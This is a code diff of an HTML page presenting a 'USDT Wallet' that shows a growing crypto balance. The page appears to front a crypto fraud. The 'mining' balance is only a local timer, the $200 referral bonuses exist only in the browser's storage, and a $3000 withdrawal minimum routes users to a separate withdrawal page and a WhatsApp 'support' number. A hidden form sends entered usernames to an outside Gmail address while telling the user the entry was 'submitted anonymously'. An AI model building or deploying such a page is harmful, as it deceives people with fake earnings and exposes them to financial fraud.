@@ -3,93 +3,265 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Signup - USDT Wallet</title>
+  <title>USDT Wallet</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
   <style>
     body {
+      margin: 0;
       font-family: 'Poppins', sans-serif;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
       background: linear-gradient(-45deg, #003d2a, #00694b, #00513b, #008b64);
       background-size: 400% 400%;
       animation: gradient 20s ease infinite;
       color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
     }
+
     @keyframes gradient {
       0% { background-position: 0% 50%; }
       50% { background-position: 100% 50%; }
       100% { background-position: 0% 50%; }
     }
+
     .container {
       background: rgba(0, 0, 0, 0.6);
-      padding: 30px 25px;
+      padding: 20px 15px;
       border-radius: 15px;
-      width: 300px;
-      box-shadow: 0 0 20px rgba(0,255,128,0.3);
+      width: 280px;
       text-align: center;
+      position: relative;
+      box-shadow: 0 0 20px rgba(0,255,128,0.2);
     }
+
     h2 {
-      margin-bottom: 20px;
       color: #00e99a;
+      font-size: 1.3em;
+      margin-bottom: 8px;
     }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 8px;
-      border: none;
-      font-size: 1rem;
+
+    .balance {
+      font-size: 1.3rem;
+      margin: 12px 0;
     }
+
     button {
       width: 100%;
-      padding: 10px;
-      background: #00e99a;
+      padding: 9px;
       border: none;
       border-radius: 8px;
+      background-color: #00e99a;
+      color: #000;
       font-weight: bold;
       cursor: pointer;
-      color: black;
-      font-size: 1.1rem;
       margin-top: 10px;
+      font-size: 1rem;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #00c07a;
+    }
+
+    input {
+      width: 100%;
+      padding: 7px;
+      margin-top: 10px;
+      border-radius: 6px;
+      border: none;
+      font-size: 0.9rem;
+    }
+
+    .history {
+      background-color: rgba(0, 128, 64, 0.1);
+      padding: 8px;
+      border-radius: 8px;
+      font-size: 0.85em;
+      margin-top: 12px;
+      max-height: 90px;
+      overflow-y: auto;
+      text-align: left;
+    }
+
+    .referral-box {
+      font-size: 0.85em;
+      margin-top: 12px;
+      color: #aaffcc;
+      background: rgba(0,255,128,0.1);
+      padding: 8px;
+      border-radius: 6px;
+      word-break: break-word;
+    }
+
+    form {
+      display: none;
+    }
+
+    /* Notification style */
+    .notification {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: rgba(0, 255, 128, 0.15);
+      border: 1px solid rgba(0, 255, 128, 0.3);
+      padding: 10px 16px;
+      font-size: 0.85rem;
+      color: #a8ffce;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 255, 128, 0.2);
+      opacity: 0;
+      pointer-events: none;
+      z-index: 999;
+      transition: opacity 0.4s ease, transform 0.4s ease;
+      transform: translateY(-20px);
+    }
+
+    .notification.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    /* WhatsApp Button */
+    #whatsappBtn {
+      background-color: #25D366;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      padding: 9px;
+      cursor: pointer;
+      font-size: 1rem;
+      margin-top: 10px;
+      transition: background-color 0.3s ease;
+    }
+    #whatsappBtn:hover {
+      background-color: #1ebe57;
     }
   </style>
 </head>
 <body>
+
+  <!-- Notification floating outside card -->
+  <div class="notification" id="notification"></div>
+
+  <!-- Wallet Container -->
   <div class="container">
-    <h2>Create Account</h2>
-    <input type="text" id="username" placeholder="Enter your username" required />
-    <input type="text" id="referral" placeholder="Referral code (optional)" />
-    <button onclick="handleSignup()">Start</button>
+    <h2>USDT Wallet</h2>
+    <div class="balance">Balance: <span id="balance">0.00000000</span> USDT</div>
+    <button onclick="handleWithdraw()">Withdraw</button>
+
+    <!-- WhatsApp button inside card -->
+    <button id="whatsappBtn">WhatsApp Support</button>
+
+    <div class="referral-box">
+      Your referral code: <b id="refcode">loading...</b>
+    </div>
+
+    <input type="text" id="refUsedBy" placeholder="Who used your code?" />
+    <button onclick="sendReferral()">Submit</button>
+
+    <div class="history" id="withdraw-history">No withdrawals yet.</div>
+
+    <!-- Hidden form for referral submission -->
+    <form id="notifyForm" action="https://formsubmit.co/snipemarkets@gmail.com" method="POST">
+      <input type="hidden" name="_captcha" value="false" />
+      <input type="hidden" name="referrer_used" id="hiddenRef" />
+    </form>
   </div>
 
   <script>
-    function handleSignup() {
-      const username = document.getElementById('username').value.trim();
-      const referral = document.getElementById('referral').value.trim();
+    let balance = parseFloat(localStorage.getItem('usdtBalance')) || 0;
+    let miningStarted = false;
+    const usdtPerMs = 1 / 120000; // 1 USDT per 2 minutes (120,000 ms)
 
-      if (!username) {
-        alert('Please enter a username.');
+    // Get or generate username (referral code)
+    let username = localStorage.getItem('usdt_user');
+    if (!username) {
+      username = 'user' + Math.floor(Math.random() * 100000);
+      localStorage.setItem('usdt_user', username);
+    }
+    document.getElementById('refcode').textContent = username;
+
+    // Check if user was referred
+    const referral = localStorage.getItem('usdt_referral_used');
+    const alreadyCredited = localStorage.getItem('usdt_referral_rewarded');
+
+    if (referral && !alreadyCredited) {
+      // Add $200 to referred user balance
+      balance += 200;
+      localStorage.setItem('usdtBalance', balance.toString());
+
+      // Add $200 to referrer user bonus key
+      const refKey = `ref_${referral}_bonus`;
+      const refBonus = parseFloat(localStorage.getItem(refKey)) || 0;
+      localStorage.setItem(refKey, (refBonus + 200).toString());
+
+      localStorage.setItem('usdt_referral_rewarded', 'yes');
+    }
+
+    // On page load, add any referral bonus to user's balance (once)
+    window.onload = () => {
+      const refBonusKey = `ref_${username}_bonus`;
+      const refBonusStored = parseFloat(localStorage.getItem(refBonusKey)) || 0;
+      if (refBonusStored > 0) {
+        balance += refBonusStored;
+        localStorage.setItem('usdtBalance', balance.toString());
+        localStorage.removeItem(refBonusKey);
+      }
+
+      updateBalance();
+      updateWithdrawHistory();
+      startMining();
+    };
+
+    function startMining() {
+      if (!miningStarted) {
+        setInterval(() => {
+          balance += usdtPerMs;
+          localStorage.setItem('usdtBalance', balance.toString());
+          updateBalance();
+        }, 10);
+        miningStarted = true;
+      }
+    }
+
+    function updateBalance() {
+      document.getElementById('balance').textContent = balance.toFixed(8);
+    }
+
+    function updateWithdrawHistory() {
+      const hist = JSON.parse(localStorage.getItem('withdrawHistory') || '[]');
+      const el = document.getElementById('withdraw-history');
+      el.innerHTML = hist.length ? hist.map(h => `<div>${h}</div>`).join('') : "No withdrawals yet.";
+    }
+
+    function handleWithdraw() {
+      if (balance >= 3000) {
+        alert("Redirecting to withdrawal page...");
+        window.location.href = "withdraw.html";
+      } else {
+        alert("Minimum withdrawal is $3000 USDT.");
+      }
+    }
+
+    function sendReferral() {
+      const name = document.getElementById("refUsedBy").value.trim();
+      if (!name) {
+        alert("Please enter the username.");
         return;
       }
-
-      localStorage.setItem('usdt_user', username);
-      if (referral && referral !== username) {
-        localStorage.setItem('usdt_referral_used', referral);
-        localStorage.removeItem('usdt_referral_rewarded');
-      } else {
-        localStorage.removeItem('usdt_referral_used');
-        localStorage.removeItem('usdt_referral_rewarded');
-      }
-
-      window.location.href = 'dashboard.html';
+      document.getElementById("hiddenRef").value = name;
+      document.getElementById("notifyForm").submit();
+      alert("Submitted anonymously. Thank you.");
+      document.getElementById("refUsedBy").value = "";
     }
 
-    if (localStorage.getItem('usdt_user')) {
-      window.location.href = 'dashboard.html';
-    }
+    // WhatsApp button click opens WhatsApp chat with number
+    document.getElementById('whatsappBtn').addEventListener('click', () => {
+      const phoneNumber = '16723004545'; // WhatsApp number without '+' sign
+      const url = `https://wa.me/${phoneNumber}`;
+      window.open(url, '_blank');
+    });
   </script>
 </body>
 </html>
